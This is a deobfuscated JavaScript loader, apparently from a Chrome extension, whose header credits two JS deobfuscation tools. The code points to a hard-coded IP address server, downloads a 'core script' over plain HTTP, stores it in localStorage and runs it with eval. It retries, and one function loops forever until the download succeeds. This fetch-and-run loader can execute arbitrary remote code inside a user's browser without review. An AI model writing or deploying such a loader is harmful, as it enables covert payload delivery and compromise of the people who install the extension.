//Wed Jul 02 2025 06:13:49 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
const 服务器 = "103.148.58.86:5003";
let IP = 服务器;
var XxHttp = class {
  static ["Get"](_0x3b4fb1) {
    return new Promise(_0x1019c0 => {
      chrome.runtime.sendMessage({
        "act": "发送网络请求3_Get",
        "url": _0x3b4fb1
      }, _0x5588db => {
        _0x1019c0(_0x5588db);
      });
    });
  }
  static ["Post"](_0x5975ad, _0x3cca4c, _0x5c7ae5 = {}) {
    return new Promise(_0x332848 => {
      chrome.runtime.sendMessage({
        "act": "发送网络请求3_Post",
        "url": _0x5975ad,
        "data": _0x3cca4c,
        "headers": _0x5c7ae5
      }, _0xb8dca => {
        _0x332848(_0xb8dca);
      });
    });
  }
};
async function HttpRequest(_0x31f9ef, _0x58ca50 = "GET", _0xe5871e = {}, _0x473fa3 = {}, _0x27a14a = 5000) {
  return new Promise((_0x10ade6, _0x2afcee) => {
    {
      let _0x5a29b4 = {
        "method": _0x58ca50,
        "headers": _0x473fa3
      };
      _0x58ca50 === "POST" && (_0x5a29b4.body = JSON.stringify(_0xe5871e));
      const _0x2d84fe = setTimeout(() => {
        _0x2afcee(new Error("请求超时"));
      }, _0x27a14a);
      chrome.runtime.sendMessage({
        "act": "发送网络请求2",
        "url": _0x31f9ef,
        "data": _0x5a29b4
      }, _0x23dbb9 => {
        clearTimeout(_0x2d84fe);
        _0x10ade6(_0x23dbb9);
      });
    }
  });
}
async function 加载核心脚本() {
  let _0x12c0a4 = localStorage.getItem("核心脚本");
  if (_0x12c0a4) {
    console.log("本地存在核心脚本，尝试从网络加载");
  } else {
    {
      console.log("本地不存在核心脚本，从网络加载");
      await 无限制从网络加载核心脚本(10000);
      return;
    }
  }
  try {
    {
      let _0x26536c = "http://" + IP + "/Getinfo",
        _0x5de2fe = await HttpRequest(_0x26536c, "GET", {}, {}, 5000);
      if (_0x5de2fe.isError) {
        console.log("网络失败，加载本地脚本");
        eval(_0x12c0a4);
        return;
      }
      if (_0x5de2fe.data) {
        {
          let _0x5176aa = localStorage.getItem("版本号");
          console.log("当前的版本号", _0x5176aa);
          _0x5de2fe.data.version == _0x5176aa ? (console.log("版本号一致，直接加载"), eval(_0x12c0a4)) : (console.log("版本号不一致，重新申请"), await 从网络加载核心脚本(3, 10000));
        }
      }
    }
  } catch (_0x21fe5a) {
    console.log("网络请求超时或失败，加载本地脚本");
    eval(_0x12c0a4);
  }
}
async function 从网络加载核心脚本(_0x2af206 = 3, _0x210050 = 10000) {
  let _0x3b8058 = 0;
  while (_0x3b8058 < _0x2af206) {
    try {
      {
        let _0x56099b = "http://" + IP + "/File/0.js?a=" + Math.random(),
          _0x1e747d = await HttpRequest(_0x56099b, "GET", {}, {}, _0x210050),
          _0x22052e = _0x1e747d.txt;
        localStorage.setItem("核心脚本", _0x22052e);
        console.log("核心脚本加载成功");
        eval(_0x22052e);
        return;
      }
    } catch (_0x2afd13) {
      _0x3b8058++;
      console.error("从网络加载核心脚本失败，重试第 " + _0x3b8058 + " 次", _0x2afd13);
      _0x3b8058 < _0x2af206 ? await new Promise(_0x983b7b => setTimeout(_0x983b7b, _0x210050)) : console.error("所有重试均失败");
    }
  }
}
async function 无限制从网络加载核心脚本(_0x173c5f = 10000) {
  while (true) {
    try {
      let _0x39d9dd = "http://" + IP + "/File/0.js?a=" + Math.random(),
        _0x55cce6 = await HttpRequest(_0x39d9dd, "GET", {}, {}, _0x173c5f),
        _0x859e9b = _0x55cce6.txt;
      localStorage.setItem("核心脚本", _0x859e9b);
      console.log("核心脚本加载成功");
      eval(_0x859e9b);
      return;
    } catch (_0x3e043f) {
      console.error("从网络加载核心脚本失败，继续重试", _0x3e043f);
      await new Promise(_0x118336 => setTimeout(_0x118336, _0x173c5f));
    }
  }
}
加载核心脚本();